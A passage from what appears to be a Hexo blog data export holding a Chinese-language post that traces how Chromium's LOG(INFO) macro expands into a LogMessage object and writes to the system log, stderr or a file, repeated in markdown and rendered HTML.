LOG 宏定义：\n```cpp\n#define LOG(severity) LAZY_STREAM(LOG_STREAM(severity), LOG_IS_ON(severity))\n```\n根据这句定义，LOG(INFO) 会展开为：\n```cpp\nLAZY_STREAM(LOG_STREAM(INFO), LOG_IS_ON(INFO))\n```\n接下来需要依次解析 LAZY_STREAM、LOG_STREAM 和 LOG_IS_ON。\n\n2. 宏解析顺序\n\n2.1 LOG_IS_ON 宏解析\n\n首先解析 LOG_IS_ON(INFO)，其定义如下：\n```cpp\n#define LOG_IS_ON(severity) (::logging::ShouldCreateLogMessage(::logging::LOG_##severity))\n```\n因为 INFO 对应的日志级别常量是 LOG_INFO，所以 LOG_IS_ON(INFO) 会进一步展开为：\n```cpp\n::logging::ShouldCreateLogMessage(::logging::LOG_INFO)\n```\nShouldCreateLogMessage 是一个用于判断是否需要记录日志的函数，其实现如下：\n```cpp\nbool ShouldCreateLogMessage(int severity) {\n  if (severity < g_min_log_level)\n    return false;\n  return g_logging_destination != LOG_NONE || log_message_handler || severity >= kAlwaysPrintErrorLevel;\n}\n```\n如果当前日志级别满足输出条件，这个函数会返回 true。\n\n2.2 LOG_STREAM 宏解析\n\n如果 LOG_IS_ON(INFO) 返回 true，我们会继续解析 LOG_STREAM(INFO)：\n```cpp\n#define LOG_STREAM(severity) COMPACT_GOOGLE_LOG_##severity.stream()\n```\n这里，COMPACT_GOOGLE_LOG_##severity 将拼接成 COMPACT_GOOGLE_LOG_INFO，所以 LOG_STREAM(INFO) 最终展开为：\n```cpp\nCOMPACT_GOOGLE_LOG_INFO.stream()\n```\n2.3 COMPACT_GOOGLE_LOG_INFO 宏解析\n\nCOMPACT_GOOGLE_LOG_INFO 被定义为：\n```cpp\n#define COMPACT_GOOGLE_LOG_INFO COMPACT_GOOGLE_LOG_EX_INFO(LogMessage)\n```\n这个宏调用了 COMPACT_GOOGLE_LOG_EX_INFO，所以我们继续展开。\n\n2.4 COMPACT_GOOGLE_LOG_EX_INFO 宏解析\n\nCOMPACT_GOOGLE_LOG_EX_INFO 的定义如下：\n```cpp\n#define COMPACT_GOOGLE_LOG_EX_INFO(ClassName, ...) \\\n  ::logging::ClassName(__FILE__, __LINE__, ::logging::LOG_INFO, ##__VA_ARGS__)\n```\n这会创建一个 LogMessage 类的对象，传递当前文件名、行号和日志级别。因此 COMPACT_GOOGLE_LOG_INFO.stream() 会展开为：\n```cpp\n::logging::LogMessage(__FILE__, __LINE__, ::logging::LOG_INFO).stream()\n```\n到这里，宏解析完成。LogMessage 类的构造函数会初始化日志的文件、行号和日志级别，并返回 stream()，我们可以将消息内容通过 << 发送到流中。\n\n3. 执行 LogMessage 类构造与日志记录\n\n3.1 LogMessage 构造函数初始化\n\nLogMessage 的构造函数会将文件、行号和日志级别存储到对象中，并执行 Init 函数来初始化日志流：\n```cpp\nLogMessage::LogMessage(const char* file, int line, LogSeverity severity)\n    : severity_(severity), file_(file), line_(line) {\n  Init(file, line);\n}\n```\n3.2 Init 函数格式化日志头\n\n在 Init 函数中，日志消息会添加头部信息（包括时间戳、进程和线程 ID 等），例如：\n```cpp\nvoid LogMessage::Init(const char* file, int line) {\n  stream_ << '[';\n  if (g_log_process_id)\n    stream_ << CurrentProcessId() << ':';\n  if (g_log_thread_id)\n    stream_ << base::PlatformThread::CurrentId() << ':';\n  if (g_log_timestamp) {\n    struct timeval tv;\n    gettimeofday(&tv, nullptr);\n    time_t t = tv.tv_sec;\n    struct tm local_time;\n    localtime_r(&t, &local_time);\n    stream_ << std::setfill('0')\n            << std::setw(2) << 1 + local_time.tm_mon\n            << std::setw(2) << local_time.tm_mday\n            << '/'\n            << std::setw(2) << local_time.tm_hour\n            << std::setw(2) << local_time.tm_min\n            << std::setw(2) << local_time.tm_sec\n            << '.'\n            << std::setw(6) << tv.tv_usec\n            << ':';\n  }\n  if (g_log_tickcount)\n    stream_ << TickCount() << ':';\n  stream_ << log_severity_name(severity_) << \":\" << file << \"(\" << line << \")] \";\n  message_start_ = stream_.str().length();\n}\n```\n此代码会将日志头部信息输出到 stream_ 中。\n\n3.3 ~LogMessage 析构函数输出日志\n\n当 LogMessage 对象析构时，~LogMessage 会调用日志输出流程：\n```cpp\nLogMessage::~LogMessage() {\n  std::string str_newline(stream_.str());\n  if (log_message_handler &&\n      log_message_handler(severity_, file_, line_,\n                          message_start_, str_newline)) {\n    return;\n  }\n  if ((g_logging_destination & LOG_TO_SYSTEM_DEBUG_LOG) != 0) {\n#if defined(OS_ANDROID)\n    __android_log_write(ANDROID_LOG_INFO, \"chromium\", str_newline.c_str());\n#else\n    ignore_result(fwrite(str_newline.data(), str_newline.size(), 1, stderr));\n    fflush(stderr);\n#endif\n  }\n  if ((g_logging_destination & LOG_TO_FILE) != 0) {\n    LoggingLock logging_lock;\n    if (InitializeLogFileHandle()) {\n      ignore_result(fwrite(str_newline.data(), str_newline.size(), 1, g_log_file));\n      fflush(g_log_file);\n    }\n  }\n  if (severity_ == LOG_FATAL) {\n    base::debug::BreakDebugger();\n  }\n}\n```\n\t•\t在 Android 上，使用 __android_log_write 写入系统日志。\n\t•\t在其他平台上，会根据配置写入 stderr 或日志文件。\n\n总结\n\n\t1.\t宏展开：LOG(INFO) << \"init first stage started!\" 依次展开为 LAZY_STREAM、LOG_STREAM、COMPACT_GOOGLE_LOG_INFO，最终生成一个 LogMessage 对象并调用其 stream()。\n\t2.\t构造与格式化：LogMessage 对象在构造时会调用 Init 函数，格式化头部信息。\n\t3.\t日志输出：对象析构时，~LogMessage 检查配置，选择写入到系统日志、stderr 或文件中。","slug":"android_logd","published":0,"date":"2024-11-03T17:11:16.824Z","updated":"2024-11-04T16:32:40.298Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44risx0003v8fyg9488gxm","content":"<p>为了深入理解 LOG(INFO) &lt;&lt; “init first stage started!” 的执行流程，我们需要从宏的解析和执行流程一步步分析，直到最终消息被记录在日志中。</p>\n<ol>\n<li>解析 LOG(INFO) &lt;&lt; “init first stage started!”</li>\n</ol>\n<p>LOG(INFO) &lt;&lt; “init first stage started!” 是一个宏调用，首先解析 LOG 宏定义：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> LOG(severity) LAZY_STREAM(LOG_STREAM(severity), LOG_IS_ON(severity))</span></span><br></pre></td></tr></table></figure>\n<p>根据这句定义，LOG(INFO) 会展开为：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">LAZY_STREAM</span>(<span class=\"built_in\">LOG_STREAM</span>(INFO), <span class=\"built_in\">LOG_IS_ON</span>(INFO))</span><br></pre></td></tr></table></figure>\n<p>接下来需要依次解析 LAZY_STREAM、LOG_STREAM 和 LOG_IS_ON。</p>\n<ol start=\"2\">\n<li>宏解析顺序</li>\n</ol>\n<p>2.1 LOG_IS_ON 宏解析</p>\n<p>首先解析 LOG_IS_ON(INFO)，其定义如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> LOG_IS_ON(severity) (::logging::ShouldCreateLogMessage(::logging::LOG_##severity))</span></span><br></pre></td></tr></table></figure>\n<p>因为 INFO 对应的日志级别常量是 LOG_INFO，所以 LOG_IS_ON(INFO) 会进一步展开为：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">::logging::<span class=\"built_in\">ShouldCreateLogMessage</span>(::logging::LOG_INFO)</span><br></pre></td></tr></table></figure>\n<p>ShouldCreateLogMessage 是一个用于判断是否需要记录日志的函数，其实现如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">ShouldCreateLogMessage</span><span class=\"params\">(<span class=\"type\">int</span> severity)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (severity &lt; g_min_log_level)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> g_logging_destination != LOG_NONE || log_message_handler || severity &gt;= kAlwaysPrintErrorLevel;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果当前日志级别满足输出条件，这个函数会返回 true。</p>\n<p>2.2 LOG_STREAM 宏解析</p>\n<p>如果 LOG_IS_ON(INFO) 返回 true，我们会继续解析 LOG_STREAM(INFO)：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> LOG_STREAM(severity) COMPACT_GOOGLE_LOG_##severity.stream()</span></span><br></pre></td></tr></table></figure>\n<p>这里，COMPACT_GOOGLE_LOG_##severity 将拼接成 COMPACT_GOOGLE_LOG_INFO，所以 LOG_STREAM(INFO) 最终展开为：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">COMPACT_GOOGLE_LOG_INFO.<span class=\"built_in\">stream</span>()</span><br></pre></td></tr></table></figure>\n<p>2.3 COMPACT_GOOGLE_LOG_INFO 宏解析</p>\n<p>COMPACT_GOOGLE_LOG_INFO 被定义为：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> COMPACT_GOOGLE_LOG_INFO COMPACT_GOOGLE_LOG_EX_INFO(LogMessage)</span></span><br></pre></td></tr></table></figure>\n<p>这个宏调用了 COMPACT_GOOGLE_LOG_EX_INFO，所以我们继续展开。</p>\n<p>2.4 COMPACT_GOOGLE_LOG_EX_INFO 宏解析</p>\n<p>COMPACT_GOOGLE_LOG_EX_INFO 的定义如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> COMPACT_GOOGLE_LOG_EX_INFO(ClassName, ...) \\</span></span><br><span class=\"line\"><span class=\"meta\">  ::logging::ClassName(__FILE__, __LINE__, ::logging::LOG_INFO, ##__VA_ARGS__)</span></span><br></pre></td></tr></table></figure>\n<p>这会创建一个 LogMessage 类的对象，传递当前文件名、行号和日志级别。因此 COMPACT_GOOGLE_LOG_INFO.stream() 会展开为：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">::logging::<span class=\"built_in\">LogMessage</span>(__FILE__, __LINE__, ::logging::LOG_INFO).<span class=\"built_in\">stream</span>()</span><br></pre></td></tr></table></figure>\n<p>到这里，宏解析完成。LogMessage 类的构造函数会初始化日志的文件、行号和日志级别，并返回 stream()，我们可以将消息内容通过 &lt;&lt; 发送到流中。</p>\n<ol start=\"3\">\n<li>执行 LogMessage 类构造与日志记录</li>\n</ol>\n<p>3.1 LogMessage 构造函数初始化</p>\n<p>LogMessage 的构造函数会将文件、行号和日志级别存储到对象中，并执行 Init 函数来初始化日志流：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LogMessage::<span class=\"built_in\">LogMessage</span>(<span class=\"type\">const</span> <span class=\"type\">char</span>* file, <span class=\"type\">int</span> line, LogSeverity severity)</span><br><span class=\"line\">    : <span class=\"built_in\">severity_</span>(severity), <span class=\"built_in\">file_</span>(file), <span class=\"built_in\">line_</span>(line) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">Init</span>(file, line);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>3.2 Init 函数格式化日志头</p>\n<p>在 Init 函数中，日志消息会添加头部信息（包括时间戳、进程和线程 ID 等），例如：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">LogMessage::Init</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span>* file, <span class=\"type\">int</span> line)</span> </span>&#123;</span><br><span class=\"line\">  stream_ &lt;&lt; <span class=\"string\">&#x27;[&#x27;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_log_process_id)</span><br><span class=\"line\">    stream_ &lt;&lt; <span class=\"built_in\">CurrentProcessId</span>() &lt;&lt; <span class=\"string\">&#x27;:&#x27;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_log_thread_id)</span><br><span class=\"line\">    stream_ &lt;&lt; base::PlatformThread::<span class=\"built_in\">CurrentId</span>() &lt;&lt; <span class=\"string\">&#x27;:&#x27;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_log_timestamp) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">timeval</span> tv;</span><br><span class=\"line\">    <span class=\"built_in\">gettimeofday</span>(&amp;tv, <span class=\"literal\">nullptr</span>);</span><br><span class=\"line\">    <span class=\"type\">time_t</span> t = tv.tv_sec;</span><br><span class=\"line\">    <span class=\"keyword\">struct</span> <span class=\"title class_\">tm</span> local_time;</span><br><span class=\"line\">    <span class=\"built_in\">localtime_r</span>(&amp;t, &amp;local_time);</span><br><span class=\"line\">    stream_ &lt;&lt; std::<span class=\"built_in\">setfill</span>(<span class=\"string\">&#x27;0&#x27;</span>)</span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">2</span>) &lt;&lt; <span class=\"number\">1</span> + local_time.tm_mon</span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">2</span>) &lt;&lt; local_time.tm_mday</span><br><span class=\"line\">            &lt;&lt; <span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">2</span>) &lt;&lt; local_time.tm_hour</span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">2</span>) &lt;&lt; local_time.tm_min</span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">2</span>) &lt;&lt; local_time.tm_sec</span><br><span class=\"line\">            &lt;&lt; <span class=\"string\">&#x27;.&#x27;</span></span><br><span class=\"line\">            &lt;&lt; std::<span class=\"built_in\">setw</span>(<span class=\"number\">6</span>) &lt;&lt; tv.tv_usec</span><br><span class=\"line\">            &lt;&lt; <span class=\"string\">&#x27;:&#x27;</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_log_tickcount)</span><br><span class=\"line\">    stream_ &lt;&lt; <span class=\"built_in\">TickCount</span>() &lt;&lt; <span class=\"string\">&#x27;:&#x27;</span>;</span><br><span class=\"line\">  stream_ &lt;&lt; <span class=\"built_in\">log_severity_name</span>(severity_) &lt;&lt; <span class=\"string\">&quot;:&quot;</span> &lt;&lt; file &lt;&lt; <span class=\"string\">&quot;(&quot;</span> &lt;&lt; line &lt;&lt; <span class=\"string\">&quot;)] &quot;</span>;</span><br><span class=\"line\">  message_start_ = stream_.<span class=\"built_in\">str</span>().<span class=\"built_in\">length</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此代码会将日志头部信息输出到 stream_ 中。</p>\n<p>3.3 ~LogMessage 析构函数输出日志</p>\n<p>当 LogMessage 对象析构时，~LogMessage 会调用日志输出流程：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LogMessage::~<span class=\"built_in\">LogMessage</span>() &#123;</span><br><span class=\"line\">  <span class=\"function\">std::string <span class=\"title\">str_newline</span><span class=\"params\">(stream_.str())</span></span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (log_message_handler &amp;&amp;</span><br><span class=\"line\">      <span class=\"built_in\">log_message_handler</span>(severity_, file_, line_,</span><br><span class=\"line\">                          message_start_, str_newline)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((g_logging_destination &amp; LOG_TO_SYSTEM_DEBUG_LOG) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> defined(OS_ANDROID)</span></span><br><span class=\"line\">    __android_log_write(ANDROID_LOG_INFO, <span class=\"string\">&quot;chromium&quot;</span>, str_newline.<span class=\"built_in\">c_str</span>());</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">else</span></span></span><br><span class=\"line\">    <span class=\"built_in\">ignore_result</span>(<span class=\"built_in\">fwrite</span>(str_newline.<span class=\"built_in\">data</span>(), str_newline.<span class=\"built_in\">size</span>(), <span class=\"number\">1</span>, stderr));</span><br><span class=\"line\">    <span class=\"built_in\">fflush</span>(stderr);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ((g_logging_destination &amp; LOG_TO_FILE) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    LoggingLock logging_lock;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">InitializeLogFileHandle</span>()) &#123;</span><br><span class=\"line\">      <span class=\"built_in\">ignore_result</span>(<span class=\"built_in\">fwrite</span>(str_newline.<span class=\"built_in\">data</span>(), str_newline.<span class=\"built_in\">size</span>(), <span class=\"number\">1</span>, g_log_file));</span><br><span class=\"line\">      <span class=\"built_in\">fflush</span>(g_log_file);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (severity_ == LOG_FATAL) &#123;</span><br><span class=\"line\">    base::debug::<span class=\"built_in\">BreakDebugger</span>();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<pre><code>•    在 Android 上，使用 __android_log_write 写入系统日志。\n•    在其他平台上，会根据配置写入 stderr 或日志文件。\n</code></pre>\n<p>总结</p>\n<pre><code>1.    宏展开：LOG(INFO) &lt;&lt; &quot;init first stage started!&quot; 依次展开为 LAZY_STREAM、LOG_STREAM、COMPACT_GOOGLE_LOG_INFO，最终生成一个 LogMessage 对象并调用其 stream()。\n2.    构造与格式化：LogMessage 对象在构造时会调用 Init 函数，格式化头部信息。\n3.    日志输出：对象析构时，~LogMessage 检查配置，选择写入到系统日志、stderr 或文件中。\n</code></pre>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<p>为了深入理解 LOG(INFO) &lt;&lt; “init first stage started!” 的执行流程，我们需要从宏的解析和执行流程一步步分析，直到最终消息被记录在日志中。</p>\n<ol>\n<li>解析 LOG(INFO) &lt;&lt; “init first stage started!”</li>\n</ol>\n<p>LOG(INFO) &lt;&lt; “init first stage started!” 是一个宏调用，首先解析 LOG 宏定义：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> LOG(severity) LAZY_STREAM(LOG_STREAM(severity), LOG_IS_ON(severity))</span></span><br></pre></td></tr></table></figure>\n<p>根据这句定义，LOG(INFO) 会展开为：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">LAZY_STREAM</span>(<span class=\"built_in\">LOG_STREAM</span>(INFO), <span class=\"built_in\">LOG_IS_ON</span>(INFO))</span><br></pre></td></tr></table></figure>\n<p>接下来需要依次解析 LAZY_STREAM、LOG_STREAM 和 LOG_IS_ON。</p>\n<ol start=\"2\">\n<li>宏解析顺序</li>\n</ol>\n<p>2.1 LOG_IS_ON 宏解析</p>\n<p>首先解析 LOG_IS_ON(INFO)，其定义如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> LOG_IS_ON(severity) (::logging::ShouldCreateLogMessage(::logging::LOG_##severity))</span></span><br></pre></td></tr></table></figure>\n<p>因为 INFO 对应的日志级别常量是 LOG_INFO，所以 LOG_IS_ON(INFO) 会进一步展开为：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">::logging::<span class=\"built_in\">ShouldCreateLogMessage</span>(::logging::LOG_INFO)</span><br></pre></td></tr></table></figure>\n<p>ShouldCreateLogMessage 是一个用于判断是否需要记录日志的函数，其实现如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">ShouldCreateLogMessage</span><span class=\"params\">(<span class=\"type\">int</span> severity)</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (severity &lt; g_min_log_level)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> g_logging_destination != LOG_NONE || log_message_handler || severity &gt;= kAlwaysPrintErrorLevel;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>如果当前日志级别满足输出条件，这个函数会返回 true。</p>\n<p>2.2 LOG_STREAM 宏解析</p>\n<p>如果 LOG_IS_ON(INFO) 返回 true，我们会继续解析 LOG_STREAM(INFO)：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> LOG_STREAM(severity) COMPACT_GOOGLE_LOG_##severity.stream()</span></span><br></pre></td></tr></table></figure>\n<p>这里，COMPACT_GOOGLE_LOG_##severity 将拼接成 COMPACT_GOOGLE_LOG_INFO，所以 LOG_STREAM(INFO) 最终展开为：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">COMPACT_GOOGLE_LOG_INFO.<span class=\"built_in\">stream</span>()</span><br></pre></td></tr></table></figure>\n<p>2.3 COMPACT_GOOGLE_LOG_INFO 宏解析</p>\n<p>COMPACT_GOOGLE_LOG_INFO 被定义为：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> COMPACT_GOOGLE_LOG_INFO COMPACT_GOOGLE_LOG_EX_INFO(LogMessage)</span></span><br></pre></td></tr></table></figure>\n<p>这个宏调用了 COMPACT_GOOGLE_LOG_EX_INFO，所以我们继续展开。</p>\n<p>2.4 COMPACT_GOOGLE_LOG_EX_INFO 宏解析</p>\n<p>COMPACT_GOOGLE_LOG_EX_INFO 的定义如下：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> COMPACT_GOOGLE_LOG_EX_INFO(ClassName, ...) \\</span></span><br><span class=\"line\"><span class=\"meta\">  ::logging::ClassName(__FILE__, __LINE__, ::logging::LOG_INFO, ##__VA_ARGS__)</span></span><br></pre></td></tr></table></figure>\n<p>这会创建一个 LogMessage 类的对象，传递当前文件名、行号和日志级别。因此 COMPACT_GOOGLE_LOG_INFO.stream() 会展开为：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">::logging::<span class=\"built_in\">LogMessage</span>(__FILE__, __LINE__, ::logging::LOG_INFO).<span class=\"built_in\">stream</span>()</span><br></pre></td></tr></table></figure>\n<p>到这里，宏解析完成。LogMessage 类的构造函数会初始化日志的文件、行号和日志级别，并返回 stream()，我们可以将消息内容通过 &lt;&lt; 发送到流中。</p>\n<ol start=\"3\">\n<li>执行 LogMessage 类构造与日志记录</li>\n</ol>\n<p>3.1 LogMessage 构造函数初始化</p>\n<p>LogMessage 的构造函数会将文件、行号和日志级别存储到对象中，并执行 Init 函数来初始化日志流：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LogMessage::<span class=\"built_in\">LogMessage</span>(<span class=\"type\">const</span> <span class=\"type\">char</span>* file, <span class=\"type\">int</span> line, LogSeverity severity)</span><br><span class=\"line\">    : <span class=\"built_in\">severity_</span>(severity), <span class=\"built_in\">file_</span>(file), <span class=\"built_in\">line_</span>(line) &#123;</span><br><span class=\"line\">  <span class=\"built_in\">Init</span>(file, line);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>3.2 Init 函数格式化日志头</p>\n<p>在 Init 函数中，日志消息会添加头部信息（包括时间戳、进程和线程 ID 等），例如：</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">LogMessage::Init</span><span class=\"params\">(<span class=\"type\">const</span> <span class=\"type\">char</span>* file, <span class=\"type\">int</span> line)</span> </span>&#123;</span><br><span class=\"line\">  stream_ &lt;&lt; <span class=\"string\">&#x27;[&#x27;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_log_process_id)</span><br><span class=\"line\">    stream_ &lt;&lt; <span class=\"built_in\">CurrentProcessId</span>() &lt;&lt; <span class=\"string\">&#x27;:&#x27;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_log_thread_id)</span><br><span class=\"line\">    stream_ &lt;&lt; base::PlatformThread::<span class=\"built_in\">CurrentId</span>() &lt;&lt; <span class=\"string\">&#x27;:&#x27;</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (g_log_timestamp) &#123;</span><br><span class=\"line\">    <span 